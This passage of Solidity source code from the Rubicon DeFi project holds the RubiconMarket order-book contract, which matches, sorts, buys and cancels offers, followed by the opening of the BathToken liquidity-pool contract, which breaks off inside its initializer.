require(isActive(id));\n        require(!isClosed());\n        _;\n    }\n\n    /// @dev After close, anyone can cancel an offer.\n    modifier can_cancel(uint256 id) virtual override {\n        require(isActive(id));\n        require((msg.sender == getOwner(id)) || isClosed());\n        _;\n    }\n\n    function isClosed() public pure returns (bool closed) {\n        return false;\n    }\n\n    function getTime() public view returns (uint64) {\n        return uint64(block.timestamp);\n    }\n\n    function stop() external auth {\n        stopped = true;\n    }\n}\n\ncontract DSNote {\n    event LogNote(\n        bytes4 indexed sig,\n        address indexed guy,\n        bytes32 indexed foo,\n        bytes32 indexed bar,\n        uint256 wad,\n        bytes fax\n    ) anonymous;\n\n    modifier note() {\n        bytes32 foo;\n        bytes32 bar;\n        uint256 wad;\n\n        assembly {\n            foo := calldataload(4)\n            bar := calldataload(36)\n            wad := callvalue()\n        }\n\n        emit LogNote(msg.sig, msg.sender, foo, bar, wad, msg.data);\n\n        _;\n    }\n}\n\ncontract MatchingEvents {\n    event LogBuyEnabled(bool isEnabled);\n    event LogMinSell(address pay_gem, uint256 min_amount);\n    event LogMatchingEnabled(bool isEnabled);\n    event LogUnsortedOffer(uint256 id);\n    event LogSortedOffer(uint256 id);\n    event LogInsert(address keeper, uint256 id);\n    event LogDelete(address keeper, uint256 id);\n    event LogMatch(uint256 id, uint256 amount);\n}\n\n/// @notice The core Rubicon Market smart contract\n/// @notice This contract is based on the original open-source work done by OasisDEX under the Apache License 2.0\n/// @dev This contract inherits the key trading functionality from SimpleMarket\ncontract RubiconMarket is MatchingEvents, ExpiringMarket, DSNote {\n    bool public buyEnabled = true; //buy enabled\n    bool public matchingEnabled = true; //true: enable matching,\n    //false: revert to expiring market\n    /// @dev Below is variable to allow for a proxy-friendly constructor\n    bool public initialized;\n\n    /// @dev unused deprecated variable for applying a token distribution on top of a trade\n    bool public AqueductDistributionLive;\n    /// @dev unused deprecated variable for applying a token distribution of this token on top of a trade\n    address public AqueductAddress;\n\n    struct sortInfo {\n        uint256 next; //points to id of next higher offer\n        uint256 prev; //points to id of previous lower offer\n        uint256 delb; //the blocknumber where this entry was marked for delete\n    }\n    mapping(uint256 => sortInfo) public _rank; //doubly linked lists of sorted offer ids\n    mapping(address => mapping(address => uint256)) public _best; //id of the highest offer for a token pair\n    mapping(address => mapping(address => uint256)) public _span; //number of offers stored for token pair in sorted orderbook\n    mapping(address => uint256) public _dust; //minimum sell amount for a token to avoid dust offers\n    mapping(uint256 => uint256) public _near; //next unsorted offer id\n    uint256 public _head; //first unsorted offer id\n    uint256 public dustId; // id of the latest offer marked as dust\n\n    /// @dev Proxy-safe initialization of storage\n    function initialize(bool _live, address _feeTo) public {\n        require(!initialized, \"contract is already initialized\");\n        AqueductDistributionLive = _live;\n\n        /// @notice The market fee recipient\n        feeTo = _feeTo;\n\n        owner = msg.sender;\n        emit LogSetOwner(msg.sender);\n\n        /// @notice The starting fee on taker trades in basis points\n        feeBPS = 20;\n\n        initialized = true;\n        matchingEnabled = true;\n        buyEnabled = true;\n    }\n\n    // After close, anyone can cancel an offer\n    modifier can_cancel(uint256 id) override {\n        require(isActive(id), \"Offer was deleted or taken, or never existed.\");\n        require(\n            isClosed() || msg.sender == getOwner(id) || id == dustId,\n            \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\"\n        );\n        _;\n    }\n\n    // ---- Public entrypoints ---- //\n\n    function make(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt\n    ) public override returns (bytes32) {\n        return bytes32(offer(pay_amt, pay_gem, buy_amt, buy_gem));\n    }\n\n    function take(bytes32 id, uint128 maxTakeAmount) public override {\n        require(buy(uint256(id), maxTakeAmount));\n    }\n\n    function kill(bytes32 id) external override {\n        require(cancel(uint256(id)));\n    }\n\n    // Make a new offer. Takes funds from the caller into market escrow.\n    //\n    // If matching is enabled:\n    //     * creates new offer without putting it in\n    //       the sorted list.\n    //     * available to authorized contracts only!\n    //     * keepers should call insert(id,pos)\n    //       to put offer in the sorted list.\n    //\n    // If matching is disabled:\n    //     * calls expiring market's offer().\n    //     * available to everyone without authorization.\n    //     * no sorting is done.\n    //\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //taker (ask) buy how much\n        ERC20 buy_gem //taker (ask) buy which token\n    ) public override returns (uint256) {\n        require(!locked, \"Reentrancy attempt\");\n\n\n            function(uint256, ERC20, uint256, ERC20) returns (uint256) fn\n         = matchingEnabled ? _offeru : super.offer;\n        return fn(pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    // Make a new offer. Takes funds from the caller into market escrow.\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos //position to insert offer, 0 should be used if unknown\n    ) external can_offer returns (uint256) {\n        return offer(pay_amt, pay_gem, buy_amt, buy_gem, pos, true);\n    }\n\n    function offer(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem, //maker (ask) buy which token\n        uint256 pos, //position to insert offer, 0 should be used if unknown\n        bool matching //match \"close enough\" orders?\n    ) public can_offer returns (uint256) {\n        require(!locked, \"Reentrancy attempt\");\n        require(_dust[address(pay_gem)] <= pay_amt);\n\n        if (matchingEnabled) {\n            return _matcho(pay_amt, pay_gem, buy_amt, buy_gem, pos, matching);\n        }\n        return super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n    }\n\n    //Transfers funds from caller to offer maker, and from market to caller.\n    function buy(uint256 id, uint256 amount)\n        public\n        override\n        can_buy(id)\n        returns (bool)\n    {\n        require(!locked, \"Reentrancy attempt\");\n\n        //Optional distribution on trade\n        if (AqueductDistributionLive) {\n            IAqueduct(AqueductAddress).distributeToMakerAndTaker(\n                getOwner(id),\n                msg.sender\n            );\n        }\n        function(uint256, uint256) returns (bool) fn = matchingEnabled\n            ? _buys\n            : super.buy;\n\n        return fn(id, amount);\n    }\n\n    // Cancel an offer. Refunds offer maker.\n    function cancel(uint256 id)\n        public\n        override\n        can_cancel(id)\n        returns (bool success)\n    {\n        require(!locked, \"Reentrancy attempt\");\n        if (matchingEnabled) {\n            if (isOfferSorted(id)) {\n                require(_unsort(id));\n            } else {\n                require(_hide(id));\n            }\n        }\n        return super.cancel(id); //delete the offer.\n    }\n\n    //insert offer into the sorted list\n    //keepers need to use this function\n    function insert(\n        uint256 id, //maker (ask) id\n        uint256 pos //position to insert into\n    ) public returns (bool) {\n        require(!locked, \"Reentrancy attempt\");\n        require(!isOfferSorted(id)); //make sure offers[id] is not yet sorted\n        require(isActive(id)); //make sure offers[id] is active\n\n        _hide(id); //remove offer from unsorted offers list\n        _sort(id, pos); //put offer into the sorted offers list\n        emit LogInsert(msg.sender, id);\n        return true;\n    }\n\n    //deletes _rank [id]\n    //  Function should be called by keepers.\n    function del_rank(uint256 id) external returns (bool) {\n        require(!locked, \"Reentrancy attempt\");\n        require(\n            !isActive(id) &&\n                _rank[id].delb != 0 &&\n                _rank[id].delb < block.number - 10\n        );\n        delete _rank[id];\n        emit LogDelete(msg.sender, id);\n        return true;\n    }\n\n    //set the minimum sell amount for a token\n    //    Function is used to avoid \"dust offers\" that have\n    //    very small amount of tokens to sell, and it would\n    //    cost more gas to accept the offer, than the value\n    //    of tokens received.\n    function setMinSell(\n        ERC20 pay_gem, //token to assign minimum sell amount to\n        uint256 dust //maker (ask) minimum sell amount\n    ) external auth note returns (bool) {\n        _dust[address(pay_gem)] = dust;\n        emit LogMinSell(address(pay_gem), dust);\n        return true;\n    }\n\n    //returns the minimum sell amount for an offer\n    function getMinSell(\n        ERC20 pay_gem //token for which minimum sell amount is queried\n    ) external view returns (uint256) {\n        return _dust[address(pay_gem)];\n    }\n\n    //set buy functionality enabled/disabled\n    function setBuyEnabled(bool buyEnabled_) external auth returns (bool) {\n        buyEnabled = buyEnabled_;\n        emit LogBuyEnabled(buyEnabled);\n        return true;\n    }\n\n    //set matching enabled/disabled\n    //    If matchingEnabled true(default), then inserted offers are matched.\n    //    Except the ones inserted by contracts, because those end up\n    //    in the unsorted list of offers, that must be later sorted by\n    //    keepers using insert().\n    //    If matchingEnabled is false then RubiconMarket is reverted to ExpiringMarket,\n    //    and matching is not done, and sorted lists are disabled.\n    function setMatchingEnabled(bool matchingEnabled_)\n        external\n        auth\n        returns (bool)\n    {\n        matchingEnabled = matchingEnabled_;\n        emit LogMatchingEnabled(matchingEnabled);\n        return true;\n    }\n\n    //return the best offer for a token pair\n    //      the best offer is the lowest one if it's an ask,\n    //      and highest one if it's a bid offer\n    function getBestOffer(ERC20 sell_gem, ERC20 buy_gem)\n        public\n        view\n        returns (uint256)\n    {\n        return _best[address(sell_gem)][address(buy_gem)];\n    }\n\n    //return the next worse offer in the sorted list\n    //      the worse offer is the higher one if its an ask,\n    //      a lower one if its a bid offer,\n    //      and in both cases the newer one if they're equal.\n    function getWorseOffer(uint256 id) public view returns (uint256) {\n        return _rank[id].prev;\n    }\n\n    //return the next better offer in the sorted list\n    //      the better offer is in the lower priced one if its an ask,\n    //      the next higher priced one if its a bid offer\n    //      and in both cases the older one if they're equal.\n    function getBetterOffer(uint256 id) external view returns (uint256) {\n        return _rank[id].next;\n    }\n\n    //return the amount of better offers for a token pair\n    function getOfferCount(ERC20 sell_gem, ERC20 buy_gem)\n        public\n        view\n        returns (uint256)\n    {\n        return _span[address(sell_gem)][address(buy_gem)];\n    }\n\n    //get the first unsorted offer that was inserted by a contract\n    //      Contracts can't calculate the insertion position of their offer because it is not an O(1) operation.\n    //      Their offers get put in the unsorted list of offers.\n    //      Keepers can calculate the insertion position offchain and pass it to the insert() function to insert\n    //      the unsorted offer into the sorted list. Unsorted offers will not be matched, but can be bought with buy().\n    function getFirstUnsortedOffer() public view returns (uint256) {\n        return _head;\n    }\n\n    //get the next unsorted offer\n    //      Can be used to cycle through all the unsorted offers.\n    function getNextUnsortedOffer(uint256 id) public view returns (uint256) {\n        return _near[id];\n    }\n\n    function isOfferSorted(uint256 id) public view returns (bool) {\n        return\n            _rank[id].next != 0 ||\n            _rank[id].prev != 0 ||\n            _best[address(offers[id].pay_gem)][address(offers[id].buy_gem)] ==\n            id;\n    }\n\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked, \"Reentrancy attempt\");\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                pay_amt * 1 ether <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    pay_amt * 10**9,\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10**9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount);\n    }\n\n    function buyAllAmount(\n        ERC20 buy_gem,\n        uint256 buy_amt,\n        ERC20 pay_gem,\n        uint256 max_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked, \"Reentrancy attempt\");\n        uint256 offerId;\n        while (buy_amt > 0) {\n            //Meanwhile there is amount to buy\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0);\n\n            // There is a chance that buy_amt is smaller than 1 wei of the other token\n            if (\n                buy_amt * 1 ether <\n                wdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (buy_amt >= offers[offerId].pay_amt) {\n                //If amount to buy is higher or equal than current offer amount to sell\n                fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount sold to acumulator\n                buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                //if lower\n                fill_amt = add(\n                    fill_amt,\n                    rmul(\n                        buy_amt * 10**9,\n                        rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n                    ) / 10**9\n                ); //Add amount sold to acumulator\n                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n                buy_amt = 0; //All amount is bought\n            }\n        }\n        require(fill_amt <= max_fill_amount);\n    }\n\n    function getBuyAmount(\n        ERC20 buy_gem,\n        ERC20 pay_gem,\n        uint256 pay_amt\n    ) external view returns (uint256 fill_amt) {\n        uint256 offerId = getBestOffer(buy_gem, pay_gem); //Get best offer for the token pair\n        while (pay_amt > offers[offerId].buy_amt) {\n            fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount to buy accumulator\n            pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to pay\n            if (pay_amt > 0) {\n                //If we still need more offers\n                offerId = getWorseOffer(offerId); //We look for the next best offer\n                require(offerId != 0); //Fails if there are not enough offers to complete\n            }\n        }\n        fill_amt = add(\n            fill_amt,\n            rmul(\n                pay_amt * 10**9,\n                rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n            ) / 10**9\n        ); //Add proportional amount of last offer to buy accumulator\n    }\n\n    function getPayAmount(\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint256 buy_amt\n    ) external view returns (uint256 fill_amt) {\n        uint256 offerId = getBestOffer(buy_gem, pay_gem); //Get best offer for the token pair\n        while (buy_amt > offers[offerId].pay_amt) {\n            fill_amt = add(fill_amt, offers[offerId].buy_amt); //Add amount to pay accumulator\n            buy_amt = sub(buy_amt, offers[offerId].pay_amt); //Decrease amount to buy\n            if (buy_amt > 0) {\n                //If we still need more offers\n                offerId = getWorseOffer(offerId); //We look for the next best offer\n                require(offerId != 0); //Fails if there are not enough offers to complete\n            }\n        }\n        fill_amt = add(\n            fill_amt,\n            rmul(\n                buy_amt * 10**9,\n                rdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) / 10**9\n        ); //Add proportional amount of last offer to pay accumulator\n    }\n\n    // ---- Internal Functions ---- //\n\n    function _buys(uint256 id, uint256 amount) internal returns (bool) {\n        require(buyEnabled);\n        if (amount == offers[id].pay_amt) {\n            if (isOfferSorted(id)) {\n                //offers[id] must be removed from sorted list because all of it is bought\n                _unsort(id);\n            } else {\n                _hide(id);\n            }\n        }\n\n        require(super.buy(id, amount));\n\n        // If offer has become dust during buy, we cancel it\n        if (\n            isActive(id) &&\n            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]\n        ) {\n            dustId = id; //enable current msg.sender to call cancel(id)\n            cancel(id);\n        }\n        return true;\n    }\n\n    //find the id of the next higher offer after offers[id]\n    function _find(uint256 id) internal view returns (uint256) {\n        require(id > 0);\n\n        address buy_gem = address(offers[id].buy_gem);\n        address pay_gem = address(offers[id].pay_gem);\n        uint256 top = _best[pay_gem][buy_gem];\n        uint256 old_top = 0;\n\n        // Find the larger-than-id order whose successor is less-than-id.\n        while (top != 0 && _isPricedLtOrEq(id, top)) {\n            old_top = top;\n            top = _rank[top].prev;\n        }\n        return old_top;\n    }\n\n    //find the id of the next higher offer after offers[id]\n    function _findpos(uint256 id, uint256 pos) internal view returns (uint256) {\n        require(id > 0);\n\n        // Look for an active order.\n        while (pos != 0 && !isActive(pos)) {\n            pos = _rank[pos].prev;\n        }\n\n        if (pos == 0) {\n            //if we got to the end of list without a single active offer\n            return _find(id);\n        } else {\n            // if we did find a nearby active offer\n            // Walk the order book down from there...\n            if (_isPricedLtOrEq(id, pos)) {\n                uint256 old_pos;\n\n                // Guaranteed to run at least once because of\n                // the prior if statements.\n                while (pos != 0 && _isPricedLtOrEq(id, pos)) {\n                    old_pos = pos;\n                    pos = _rank[pos].prev;\n                }\n                return old_pos;\n\n                // ...or walk it up.\n            } else {\n                while (pos != 0 && !_isPricedLtOrEq(id, pos)) {\n                    pos = _rank[pos].next;\n                }\n                return pos;\n            }\n        }\n    }\n\n    //return true if offers[low] priced less than or equal to offers[high]\n    function _isPricedLtOrEq(\n        uint256 low, //lower priced offer's id\n        uint256 high //higher priced offer's id\n    ) internal view returns (bool) {\n        return\n            mul(offers[low].buy_amt, offers[high].pay_amt) >=\n            mul(offers[high].buy_amt, offers[low].pay_amt);\n    }\n\n    //these variables are global only because of solidity local variable limit\n\n    //match offers with taker offer, and execute token transactions\n    function _matcho(\n        uint256 t_pay_amt, //taker sell how much\n        ERC20 t_pay_gem, //taker sell which token\n        uint256 t_buy_amt, //taker buy how much\n        ERC20 t_buy_gem, //taker buy which token\n        uint256 pos, //position id\n        bool rounding //match \"close enough\" orders?\n    ) internal returns (uint256 id) {\n        uint256 best_maker_id; //highest maker id\n        uint256 t_buy_amt_old; //taker buy how much saved\n        uint256 m_buy_amt; //maker offer wants to buy this much token\n        uint256 m_pay_amt; //maker offer wants to sell this much token\n\n        // there is at least one offer stored for token pair\n        while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n            best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];\n            m_buy_amt = offers[best_maker_id].buy_amt;\n            m_pay_amt = offers[best_maker_id].pay_amt;\n\n            // Ugly hack to work around rounding errors. Based on the idea that\n            // the furthest the amounts can stray from their \"true\" values is 1.\n            // Ergo the worst case has t_pay_amt and m_pay_amt at +1 away from\n            // their \"correct\" values and m_buy_amt and t_buy_amt at -1.\n            // Since (c - 1) * (d - 1) > (a + 1) * (b + 1) is equivalent to\n            // c * d > a * b + a + b + c + d, we write...\n            if (\n                mul(m_buy_amt, t_buy_amt) >\n                mul(t_pay_amt, m_pay_amt) +\n                    (\n                        rounding\n                            ? m_buy_amt + t_buy_amt + t_pay_amt + m_pay_amt\n                            : 0\n                    )\n            ) {\n                break;\n            }\n            // ^ The `rounding` parameter is a compromise borne of a couple days\n            // of discussion.\n            buy(best_maker_id, min(m_pay_amt, t_buy_amt));\n            emit LogMatch(id, min(m_pay_amt, t_buy_amt));\n            t_buy_amt_old = t_buy_amt;\n            t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));\n            t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;\n\n            if (t_pay_amt == 0 || t_buy_amt == 0) {\n                break;\n            }\n        }\n\n        if (\n            t_buy_amt > 0 &&\n            t_pay_amt > 0 &&\n            t_pay_amt >= _dust[address(t_pay_gem)]\n        ) {\n            //new offer should be created\n            id = super.offer(t_pay_amt, t_pay_gem, t_buy_amt, t_buy_gem);\n            //insert offer into the sorted list\n            _sort(id, pos);\n        }\n    }\n\n    // Make a new offer without putting it in the sorted list.\n    // Takes funds from the caller into market escrow.\n    // Keepers should call insert(id,pos) to put offer in the sorted list.\n    function _offeru(\n        uint256 pay_amt, //maker (ask) sell how much\n        ERC20 pay_gem, //maker (ask) sell which token\n        uint256 buy_amt, //maker (ask) buy how much\n        ERC20 buy_gem //maker (ask) buy which token\n    ) internal returns (uint256 id) {\n        require(_dust[address(pay_gem)] <= pay_amt);\n        id = super.offer(pay_amt, pay_gem, buy_amt, buy_gem);\n        _near[id] = _head;\n        _head = id;\n        emit LogUnsortedOffer(id);\n    }\n\n    //put offer into the sorted list\n    function _sort(\n        uint256 id, //maker (ask) id\n        uint256 pos //position to insert into\n    ) internal {\n        require(isActive(id));\n\n        ERC20 buy_gem = offers[id].buy_gem;\n        ERC20 pay_gem = offers[id].pay_gem;\n        uint256 prev_id; //maker (ask) id\n\n        pos = pos == 0 ||\n            offers[pos].pay_gem != pay_gem ||\n            offers[pos].buy_gem != buy_gem ||\n            !isOfferSorted(pos)\n            ? _find(id)\n            : _findpos(id, pos);\n\n        if (pos != 0) {\n            //offers[id] is not the highest offer\n            //requirement below is satisfied by statements above\n            //require(_isPricedLtOrEq(id, pos));\n            prev_id = _rank[pos].prev;\n            _rank[pos].prev = id;\n            _rank[id].next = pos;\n        } else {\n            //offers[id] is the highest offer\n            prev_id = _best[address(pay_gem)][address(buy_gem)];\n            _best[address(pay_gem)][address(buy_gem)] = id;\n        }\n\n        if (prev_id != 0) {\n            //if lower offer does exist\n            //requirement below is satisfied by statements above\n            //require(!_isPricedLtOrEq(id, prev_id));\n            _rank[prev_id].next = id;\n            _rank[id].prev = prev_id;\n        }\n\n        _span[address(pay_gem)][address(buy_gem)]++;\n        emit LogSortedOffer(id);\n    }\n\n    // Remove offer from the sorted list (does not cancel offer)\n    function _unsort(\n        uint256 id //id of maker (ask) offer to remove from sorted list\n    ) internal returns (bool) {\n        address buy_gem = address(offers[id].buy_gem);\n        address pay_gem = address(offers[id].pay_gem);\n        require(_span[pay_gem][buy_gem] > 0);\n\n        require(\n            _rank[id].delb == 0 && //assert id is in the sorted list\n                isOfferSorted(id)\n        );\n\n        if (id != _best[pay_gem][buy_gem]) {\n            // offers[id] is not the highest offer\n            require(_rank[_rank[id].next].prev == id);\n            _rank[_rank[id].next].prev = _rank[id].prev;\n        } else {\n            //offers[id] is the highest offer\n            _best[pay_gem][buy_gem] = _rank[id].prev;\n        }\n\n        if (_rank[id].prev != 0) {\n            //offers[id] is not the lowest offer\n            require(_rank[_rank[id].prev].next == id);\n            _rank[_rank[id].prev].next = _rank[id].next;\n        }\n\n        _span[pay_gem][buy_gem]--;\n        _rank[id].delb = block.number; //mark _rank[id] for deletion\n        return true;\n    }\n\n    //Hide offer from the unsorted order book (does not cancel offer)\n    function _hide(\n        uint256 id //id of maker offer to remove from unsorted list\n    ) internal returns (bool) {\n        uint256 uid = _head; //id of an offer in unsorted offers list\n        uint256 pre = uid; //id of previous offer in unsorted offers list\n\n        require(!isOfferSorted(id)); //make sure offer id is not in sorted offers list\n\n        if (_head == id) {\n            //check if offer is first offer in unsorted offers list\n            _head = _near[id]; //set head to new first unsorted offer\n            _near[id] = 0; //delete order from unsorted order list\n            return true;\n        }\n        while (uid > 0 && uid != id) {\n            //find offer in unsorted order list\n            pre = uid;\n            uid = _near[uid];\n        }\n        if (uid != id) {\n            //did not find offer id in unsorted offers list\n            return false;\n        }\n        _near[pre] = _near[id]; //set previous unsorted offer to point to offer after offer id\n        _near[id] = 0; //delete order from unsorted order list\n        return true;\n    }\n\n    function setFeeBPS(uint256 _newFeeBPS) external auth returns (bool) {\n        feeBPS = _newFeeBPS;\n        return true;\n    }\n\n    /// @dev unused deprecated function for applying a token distribution on top of a trade\n    function setAqueductDistributionLive(bool live)\n        external\n        auth\n        returns (bool)\n    {\n        AqueductDistributionLive = live;\n        return true;\n    }\n\n    /// @dev unused deprecated variable for applying a token distribution on top of a trade\n    function setAqueductAddress(address _Aqueduct)\n        external\n        auth\n        returns (bool)\n    {\n        AqueductAddress = _Aqueduct;\n        return true;\n    }\n\n    function setFeeTo(address newFeeTo) external auth returns (bool) {\n        feeTo = newFeeTo;\n        return true;\n    }\n}\n\ninterface IWETH {\n    function deposit() external payable;\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function withdraw(uint256) external;\n\n    function approve(address guy, uint256 wad) external returns (bool);\n}\n\ninterface IAqueduct {\n    function distributeToMakerAndTaker(address maker, address taker)\n        external\n        returns (bool);\n}\n\n\n// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice This contract represents a single-asset liquidity pool for Rubicon Pools\n/// @notice Any user can deposit assets into this pool and earn yield from successful strategist market making with their liquidity\n/// @notice This contract looks to both BathPairs and the BathHouse as its admin\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"../interfaces/IBathHouse.sol\";\nimport \"../interfaces/IRubiconMarket.sol\";\nimport \"../interfaces/IBathBuddy.sol\";\n\ncontract BathToken {\n    using SafeMath for uint256;\n\n    /// *** Storage Variables ***\n\n    /// @notice The initialization status of the Bath Token\n    bool public initialized;\n\n    /// @notice  ** ERC-20 **\n    string public symbol;\n    string public name;\n    uint8 public decimals;\n\n    /// @notice The RubiconMarket.sol instance that all pool liquidity is intially directed to as market-making offers\n    address public RubiconMarketAddress;\n\n    /// @notice The Bath House admin of the Bath Token\n    address public bathHouse;\n\n    /// @notice The withdrawal fee recipient, typically the Bath Token itself\n    address public feeTo;\n\n    /// @notice The underlying ERC-20 token which is the core asset of the Bath Token vault\n    IERC20 public underlyingToken;\n\n    /// @notice The basis point fee rate that is paid on withdrawing the underlyingToken and bonusTokens\n    uint256 public feeBPS;\n\n    /// @notice ** ERC-20 **\n    uint256 public totalSupply;\n\n    /// @notice The amount of underlying deposits that are outstanding attempting market-making on the order book for yield\n    /// @dev quantity of underlyingToken that is in the orderbook that the pool still has a claim on\n    /// @dev The underlyingToken is effectively mark-to-marketed when it enters the book and it could be returned at a loss due to poor strategist performance\n    /// @dev outstandingAmount is NOT inclusive of any non-underlyingToken assets sitting on the Bath Tokens that have filled to here and are awaiting rebalancing to the underlyingToken by strategists\n    uint256 public outstandingAmount;\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    uint256[] deprecatedStorageArray; // Kept in to avoid storage collision bathTokens that are proxy upgraded\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    mapping(uint256 => uint256) deprecatedMapping; // Kept in to avoid storage collision on bathTokens that are upgraded\n    // *******************************************\n\n    /// @notice  ** ERC-20 **\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /// @notice EIP-2612\n    bytes32 public DOMAIN_SEPARATOR;\n\n    /// @notice EIP-2612\n    /// @dev keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n    /// @notice EIP-2612\n    mapping(address => uint256) public nonces;\n\n    /// @notice Array of Bonus ERC-20 tokens that are given as liquidity incentives to pool withdrawers\n    address[] public bonusTokens;\n\n    /// @notice Address of the OZ Vesting Wallet which acts as means to vest bonusToken incentives to pool HODLers\n    IBathBuddy public rewardsVestingWallet;\n\n    /// *** Events ***\n\n    /// @notice ** ERC-20 **\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    /// @notice ** ERC-20 **\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Time of Bath Token instantiation\n    event LogInit(uint256 timeOfInit);\n\n    /// @notice Log details about a pool deposit\n    event LogDeposit(\n        uint256 depositedAmt,\n        IERC20 asset,\n        uint256 sharesReceived,\n        address depositor,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool withdraw\n    event LogWithdraw(\n        uint256 amountWithdrawn,\n        IERC20 asset,\n        uint256 sharesWithdrawn,\n        address withdrawer,\n        uint256 fee,\n        address feeTo,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool rebalance\n    event LogRebalance(\n        IERC20 pool_asset,\n        address destination,\n        IERC20 transferAsset,\n        uint256 rebalAmt,\n        uint256 stratReward,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order canceled in the Rubicon Market book\n    event LogPoolCancel(\n        uint256 orderId,\n        IERC20 pool_asset,\n        uint256 outstandingAmountToCancel,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order placed in the Rubicon Market book\n    event LogPoolOffer(\n        uint256 id,\n        IERC20 pool_asset,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log the credit to outstanding amount for funds that have been filled market-making\n    event LogRemoveFilledTradeAmount(\n        IERC20 pool_asset,\n        uint256 fillAmount,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice * EIP 4626 *\n    event Deposit(\n        address indexed caller,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// @notice * EIP 4626 *\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// *** Constructor ***\n\n    /// @notice Proxy-safe initialization of storage; the constructor\n    function initialize(\n        ERC20 token,\n        address market,\n        address _feeTo\n    ) external {\n        require(!initialized);\n        string memory _symbol = string(\n            abi.encodePacked((\"bath\"), token.symbol())\n        );\n        symbol = _symbol;\n        underlyingToken = token;\n        RubiconMarketAddress = market;\n        